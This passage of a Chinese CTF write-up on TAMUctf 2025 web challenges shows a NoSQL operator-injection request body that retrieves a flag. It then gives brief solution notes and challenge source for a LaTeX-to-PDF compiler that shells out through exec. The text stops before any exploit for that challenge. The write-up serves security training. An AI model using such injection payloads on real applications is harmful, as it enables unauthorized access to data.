</span></span><span class=line><span class=cl><span class=n>Priority</span><span class=o>:</span> <span class=l>u=0, i</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>22</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;title&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;$ne&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>}}</span>
</span></span></code></pre></td></tr></table></div></div><p>得到<code>FLAG{nosql_n0_pr0bl3m}</code></p><h2 id=impossible108-solves>Impossible(108 solves)</h2><p>先把游戏保存下来，访问<code>/impossible_ctf.swf</code>然后<strong>JPEXS Free Flash Decompiler</strong>用这个工具进行分析，这里面没有牵扯地址的问题，不然就是逆向了，用exe的启动方式打开</p><p><img src=/p/tamuctf2025-web-all/QQ20250329-161557.jpg width=1000 height=700 loading=lazy alt=1></p><p>这个和web关系真不大</p><h2 id=transparency99-solves>Transparency(99 solves)</h2><p>这个解题思路更像是渗透，</p><p><img src=/p/tamuctf2025-web-all/QQ20250329-154258.jpg width=777 height=924 loading=lazy alt=1></p><p>题目意思已经很明确了，就是说每个人可以创造私域，其中有自己的文档，当我选择创建新文档的时候发现什么事情都没有发生，回显为</p><blockquote><p>New document creation is currently disabled following a request from law enforcement.</p></blockquote><p>那flag能在哪里呢，只能在之前创建的私域里面了，那我们需要去查域名<a class=link href=https://crt.sh/ target=_blank rel=noopener>https查询域名</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://tve987yv.transparency.cybr.club/
</span></span></code></pre></td></tr></table></div></div><p>访问就是flag</p><h2 id=research7-solves>Research(7 solves)</h2><p>题目说明了五分钟重启一次，所以我们现在本地搭建一下docker，先把多余容器删了，再启动</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>docker stop 27bea68fe303 &amp;&amp; docker rm 27bea68fe303 &amp;&amp; docker rmi 0fa340091225
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>docker build -t my_php_nginx_app .
</span></span><span class=line><span class=cl>docker run -d -p 8080:80 --name my_php_nginx_app my_php_nginx_app
</span></span></code></pre></td></tr></table></div></div><p>发现docker拉不下来，额，慢慢看代码吧，首先看<code>editor/editor.js</code>，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>EditorState</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;@codemirror/state&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>EditorView</span><span class=p>,</span> <span class=nx>lineNumbers</span><span class=p>,</span> <span class=nx>keymap</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;@codemirror/view&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>defaultKeymap</span><span class=p>,</span> <span class=nx>historyKeymap</span><span class=p>,</span> <span class=nx>insertTab</span><span class=p>,</span> <span class=nx>history</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;@codemirror/commands&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>StreamLanguage</span><span class=p>,</span> <span class=nx>indentOnInput</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;@codemirror/language&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>closeBrackets</span><span class=p>,</span> <span class=nx>closeBracketsKeymap</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;@codemirror/autocomplete&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>stex</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;@codemirror/legacy-modes/mode/stex&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>dracula</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;@uiw/codemirror-theme-dracula&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>createEditorState</span><span class=p>(</span><span class=nx>initialContent</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>extensions</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=nx>dracula</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>EditorView</span><span class=p>.</span><span class=nx>lineWrapping</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>lineNumbers</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=nx>indentOnInput</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=nx>history</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=nx>closeBrackets</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>        <span class=nx>StreamLanguage</span><span class=p>.</span><span class=nx>define</span><span class=p>(</span><span class=nx>stex</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=nx>keymap</span><span class=p>.</span><span class=k>of</span><span class=p>([</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span> <span class=nx>key</span><span class=o>:</span> <span class=s1>&#39;Tab&#39;</span><span class=p>,</span> <span class=nx>run</span><span class=o>:</span> <span class=nx>insertTab</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>...</span><span class=nx>defaultKeymap</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>...</span><span class=nx>historyKeymap</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>...</span><span class=nx>closeBracketsKeymap</span>
</span></span><span class=line><span class=cl>        <span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>EditorState</span><span class=p>.</span><span class=nx>create</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=nx>doc</span><span class=o>:</span> <span class=nx>initialContent</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>extensions</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>createEditorView</span><span class=p>(</span><span class=nx>state</span><span class=p>,</span> <span class=nx>parent</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>new</span> <span class=nx>EditorView</span><span class=p>({</span> <span class=nx>state</span><span class=p>,</span> <span class=nx>parent</span> <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>export</span> <span class=p>{</span> <span class=nx>createEditorState</span><span class=p>,</span> <span class=nx>createEditorView</span> <span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>这里写的是编辑器的东西，也就是网页的那个框框的语法之类的，但是其中有个问题，就是引入了LaTeX语法支持(旧版模式)<code>@codirror/legacy-modes/mode/stex</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=cm>/*compile.php*/</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>require_once</span> <span class=s1>&#39;vendor/autoload.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>require_once</span> <span class=s1>&#39;helper.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Ramsey\Uuid\Uuid</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>return_pdf</span><span class=p>(</span><span class=nv>$pdf</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Content-Type: application/pdf&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Content-Disposition: inline; filename=&#34;paper.pdf&#34;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$pdf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>init_session</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$compUuid</span> <span class=o>=</span> <span class=nx>Uuid</span><span class=o>::</span><span class=na>uuid4</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>toString</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$sessUuid</span> <span class=o>=</span> <span class=nx>decrypt_text</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;uuid&#39;</span><span class=p>],</span> <span class=nv>$serverKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$key</span> <span class=o>=</span> <span class=nx>decrypt_text</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>],</span> <span class=nv>$serverKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$latex</span> <span class=o>=</span> <span class=nx>decrypt_text</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;latex&#39;</span><span class=p>],</span> <span class=nv>$serverKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$dir</span> <span class=o>=</span> <span class=s2>&#34;/var/tmp/</span><span class=si>$compUuid</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s1>&#39;/tmp&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$sessUuid</span><span class=s2>.tex.enc&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> 
</span></span><span class=line><span class=cl>    <span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$sessUuid</span><span class=s2>.text.enc&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>    <span class=nx>decrypt_text</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$sessUuid</span><span class=s2>.tex.enc&#34;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>)</span> <span class=o>==</span> <span class=nv>$latex</span>
</span></span><span class=line><span class=cl><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>return_pdf</span><span class=p>(</span><span class=nx>decrypt_file</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$sessUuid</span><span class=s2>.pdf.enc&#34;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>exec</span><span class=p>(</span><span class=s2>&#34;mkdir </span><span class=si>$dir</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$texFile</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$dir</span><span class=s2>/paper.tex&#34;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$texFile</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$texFile</span><span class=p>,</span> <span class=nv>$latex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>fclose</span><span class=p>(</span><span class=nv>$texFile</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>exec</span><span class=p>(</span><span class=s2>&#34;pdflatex -halt-on-error -output-directory </span><span class=si>$dir</span><span class=s2> </span><span class=si>$dir</span><span class=s2>/paper.tex&#34;</span><span class=p>,</span> <span class=nv>$output</span><span class=p>,</span> <span class=nv>$returnCode</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$returnCode</span> <span class=o>!==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>http_response_code</span><span class=p>(</span><span class=mi>400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;Compilation failed.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>encrypt_file</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$dir</span><span class=s2>/paper.pdf&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=si>$sessUuid</span><span class=s2>.pdf.enc&#34;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>encrypt_file</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$dir</span><span class=s2>/paper.tex&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=si>$sessUuid</span><span class=s2>.tex.enc&#34;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>exec</span><span class=p>(</span><span class=s2>&#34;rm -rf </span><span class=si>$dir</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>return_pdf</span><span class=p>(</span><span class=nx>decrypt_file</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$sessUuid</span><span class=s2>.pdf.enc&#34;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>1.<strong>解密输入</strong> → 2. <strong>检查缓存</strong> → 3. <strong>无缓存时编译 LaTeX</strong> → 4. <strong>缓存结果并 PDF</strong>。将我们输入的内容放进tmp里面然后通过PDF打印出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=cm>/*helper.php*/</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>require_once</span> <span class=s1>&#39;vendor/autoload.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Ramsey\Uuid\Uuid</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$serverKey</span> <span class=o>=</span> <span class=nx>getenv</span><span class=p>(</span><span class=s1>&#39;SERVER_KEY&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>encrypt_file</span><span class=p>(</span><span class=nv>$inputPath</span><span class=p>,</span> <span class=nv>$outputPath</span><span class=p>,</span> <span class=nv>$key</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>exec</span><span class=p>(</span><span class=s2>&#34;openssl enc -aes-256-ctr -salt -pbkdf2 -in </span><span class=si>$inputPath</span><span class=s2> -out </span><span class=si>$outputPath</span><span class=s2> -pass pass:</span><span class=si>$key</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>decrypt_file</span><span class=p>(</span><span class=nv>$path</span><span class=p>,</span> <span class=nv>$key</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s2>&#34;openssl enc -d -aes-256-ctr -pbkdf2 -in </span><span class=si>$path</span><span class=s2> -out /dev/stdout -pass pass:</span><span class=si>$key</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>encrypt_text</span><span class=p>(</span><span class=nv>$plaintext</span><span class=p>,</span> <span class=nv>$key</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cipher</span> <span class=o>=</span> <span class=s1>&#39;aes-256-ctr&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$iv</span> <span class=o>=</span> <span class=nx>random_bytes</span><span class=p>(</span><span class=nx>openssl_cipher_iv_length</span><span class=p>(</span><span class=nv>$cipher</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ciphertext</span> <span class=o>=</span> <span class=nx>openssl_encrypt</span><span class=p>(</span><span class=nv>$plaintext</span><span class=p>,</span> <span class=nv>$cipher</span><span class=p>,</span> <span class=nv>$key</span><span class=p>,</span> <span class=nx>OPENSSL_RAW_DATA</span><span class=p>,</span> <span class=nv>$iv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nv>$iv</span> <span class=o>.</span> <span class=nv>$ciphertext</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>decrypt_text</span><span class=p>(</span><span class=nv>$enctext</span><span class=p>,</span> <span class=nv>$key</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cipher</span> <span class=o>=</span> <span class=s1>&#39;aes-256-ctr&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> <span class=nx>hex2bin</span><span class=p>(</span><span class=nv>$enctext</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ivLength</span> <span class=o>=</span> <span class=nx>openssl_cipher_iv_length</span><span class=p>(</span><span class=nv>$cipher</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$iv</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$ivLength</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ciphertext</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$ivLength</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>openssl_decrypt</span><span class=p>(</span><span class=nv>$ciphertext</span><span class=p>,</span> <span class=nv>$cipher</span><span class=p>,</span> <span class=nv>$key</span><span class=p>,</span> <span class=nx>OPENSSL_RAW_DATA</span><span class=p>,</span> <span class=nv>$iv</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>init_session</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$serverKey</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;uuid&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$uuid</span> <span class=o>=</span> <span class=nx>Uuid</span><span class=o>::</span><span class=na>uuid4</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>toString</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;uuid&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>encrypt_text</span><span class=p>(</span><span class=nv>$uuid</span><span class=p>,</span> <span class=nv>$serverKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$key</span> <span class=o>=</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>32</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>encrypt_text</span><span class=p>(</span><span class=nv>$key</span><span class=p>,</span> <span class=nv>$serverKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;latex&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$latex</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;template.tex&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;latex&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>encrypt_text</span><span class=p>(</span><span class=nv>$latex</span><span class=p>,</span> <span class=nv>$serverKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>进行一个会话加密，并且我们得知<code>SERVER_KEY</code>在环境变量中，查看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=cm>/*index.php*/</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>require_once</span> <span class=s1>&#39;helper.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>init_session</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$latex</span> <span class=o>=</span> <span class=nx>decrypt_text</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;latex&#39;</span><span class=p>],</span> <span class=nv>$serverKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>检测session</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=kr>async</span> <span class=kd>function</span> <span class=nx>compile</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>data</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URLSearchParams</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=nx>data</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=s1>&#39;latex&#39;</span><span class=p>,</span> <span class=nx>view</span><span class=p>.</span><span class=nx>state</span><span class=p>.</span><span class=nx>doc</span><span class=p>.</span><span class=nx>toString</span><span class=p>());</span>
